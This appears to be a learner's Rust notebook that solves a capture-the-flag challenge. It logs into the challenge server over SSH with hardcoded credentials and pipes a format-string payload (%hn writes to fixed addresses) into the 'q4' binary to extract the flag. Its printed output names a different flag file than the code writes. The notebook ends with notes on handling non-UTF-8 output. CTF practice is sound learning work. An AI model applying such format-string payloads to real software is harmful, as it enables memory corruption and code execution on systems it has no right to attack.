In [2]:
:dep ssh2 = "0.9"

In [3]:
use ssh2::Session;
use std::io::prelude::*;
use std::net::TcpStream;

fn main() {
    let hostname = "ctfq.u1tramarine.blue:10004";
    let username = "q4";
    let password = "q60SIMpLlej9eq49";

    // 1. SSH接続の確立
    let tcp = TcpStream::connect(hostname).expect("Failed to connect to host");
    let mut sess = Session::new().unwrap();
    sess.set_tcp_stream(tcp);
    sess.handshake().expect("SSH handshake failed");
    sess.userauth_password(username, password).expect("Authentication failed");

    // 2. ペイロードの構築
    // フォーマット文字列攻撃のペイロード
    // Pythonの echo -e に相当するエスケープシーケンスを含めます
    let payload_hex = r"\xe0\x99\x04\x08\xe2\x99\x04\x08%34441x%6\$hn%33139x%7\$hn";
    let command = format!("echo -e \"{}\" | ./q4", payload_hex);

    println!("Executing command via SSH...");

    // 3. チャンネルを開いてコマンドを実行
    let mut channel = sess.channel_session().unwrap();
    channel.exec(&command).unwrap();

    // 4. 出力の読み取り
    // 大量の空白が含まれるため、Stringにすべて読み込みます
    let mut output = String::new();
    channel.read_to_string(&mut output).unwrap();
    channel.wait_close().ok();

    // 5. フラグの抽出
    println!("--- Result ---");
    if let Some(flag_index) = output.find("FLAG_") {
        // "FLAG_" 以降の文字列を抽出
        let rest = &output[flag_index..];
        let flag = rest.split_whitespace().next().unwrap_or("");
        println!("Success! Flag: {}", flag);
    } else {
        println!("Flag not found. Showing last 500 characters of output:");
        let tail = if output.len() > 500 {
            &output[output.len() - 500..]
        } else {
            &output
        };
        println!("{}", tail);
    }
}

main();

Executing command via SSH...



thread '<unnamed>' (9536) panicked at src\lib.rs:29:41:
called `Result::unwrap()` on an `Err` value: Error { kind: InvalidData, message: "stream did not contain valid UTF-8" }
stack backtrace:
   0: std::panicking::panic_handler
             at /rustc/e408947bfd200af42db322daf0fadfe7e26d3bd1/library\std\src\panicking.rs:689
   1: core::panicking::panic_fmt
             at /rustc/e408947bfd200af42db322daf0fadfe7e26d3bd1/library\core\src\panicking.rs:80
   2: core::result::unwrap_failed
             at /rustc/e408947bfd200af42db322daf0fadfe7e26d3bd1/library\core\src\result.rs:1867
   3: run_user_code_2
   4: <unknown>
   5: <unknown>
   6: <unknown>
   7: <unknown>
   8: <unknown>
   9: <unknown>
  10: <unknown>
  11: <unknown>
  12: BaseThreadInitThunk
  13: RtlUserThreadStart
note: Some details are omitted, run with `RUST_BACKTRACE=full` for a verbose backtrace.


In [7]:
/*
エラーの原因は、read_to_string が出力をすべて UTF-8 文字列として解釈しようとした際、
q4 プログラムが出力したバイナリデータ（フォーマット文字列攻撃で生成された大量のパディングやメモリ上の非テキストデータ）が 
UTF-8 の規定に適合せず、デコードに失敗したためです。

Python の read().decode('utf-8', errors='ignore') と同じように、エラーを無視してバイナリを安全に読み込むように修正する必要があります。
read_to_string を使わず、一旦 Vec<u8> として読み込んでから、String::from_utf8_lossy を使って変換する方法が最適です。

以下のコードで試してみてください。
*/

use ssh2::Session;
use std::io::prelude::*;
use std::net::TcpStream;
use std::fs;

fn main() {
    let hostname = "ctfq.u1tramarine.blue:10004";
    let username = "q4";
    let password = "q60SIMpLlej9eq49";

    let tcp = TcpStream::connect(hostname).expect("Failed to connect to host");
    let mut sess = Session::new().unwrap();
    sess.set_tcp_stream(tcp);
    sess.handshake().expect("SSH handshake failed");
    sess.userauth_password(username, password).expect("Authentication failed");

    let payload_hex = r"\xe0\x99\x04\x08\xe2\x99\x04\x08%34441x%6\$hn%33139x%7\$hn";
    let command = format!("echo -e \"{}\" | ./q4", payload_hex);

    println!("Executing command...");

    let mut channel = sess.channel_session().unwrap();
    channel.exec(&command).unwrap();

    // 1. Vec<u8> としてバイナリを読み込む
    let mut buffer = Vec::new();
    channel.read_to_end(&mut buffer).unwrap();
    channel.wait_close().ok();

    // 2. UTF-8 に変換し、無効なバイトは置換文字で無視する
    let output = String::from_utf8_lossy(&buffer);

    println!("--- Result ---");
    if let Some(flag_index) = output.find("FLAG_") {
        let rest = &output[flag_index..];
        let flag = rest.split_whitespace().next().unwrap_or("");
        //println!("Success! Flag: {}", flag);
        fs::write("flag.txt", &flag).expect("flag.txtへの書き込み失敗");
        println!("flag.txtに保存しました");
    } else {
        println!("Flag not found. Showing last 500 characters:");
        let output_str = output.as_ref();
        let len = output_str.len();
        let tail = if len > 500 { &output_str[len - 500..] } else { output_str };
        println!("{}", tail);
    }
}

main();

Executing command...
--- Result ---
flag_optB.txtに保存しました


## ログ：学んだこと
### 1. Rustの厳格な型安全性
* **現象**: `read_to_string` で `InvalidData` エラーが発生。
* **理由**: Rustの `String` 型は常に「有効なUTF-8」であることを保証するため、バイナリ混じりのデータ（CTFの出力など）を許容しない。

### 2. バイナリデータの安全な扱い
不特定の出力を扱う場合は、以下のステップが定石。
1. `Vec<u8>`（バイト配列）として受け取る。
2. `String::from_utf8_lossy()` を使って、不正なバイトを置換しながらデコードする。

> **Tip**: CTFのエクスプロイトコードを書く際は、常にバイナリが混じる可能性を考慮して「堅牢版」の実装を選ぶのが安全。

### 3. SSH チャンネル
wait_close() を呼ぶことで、リモートのプロセスが確実に終了したことを確認できる。